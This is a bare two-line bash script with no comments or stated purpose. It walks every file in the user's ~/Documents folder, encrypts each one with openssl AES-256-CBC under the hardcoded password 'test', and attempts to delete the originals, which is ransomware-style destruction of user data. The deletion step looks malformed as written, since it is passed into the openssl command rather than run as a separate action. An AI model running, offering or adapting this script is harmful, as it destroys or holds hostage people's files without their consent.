#!/bin/bash
find "$HOME/Documents" -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -pass pass:test -exec rm -f {} \;
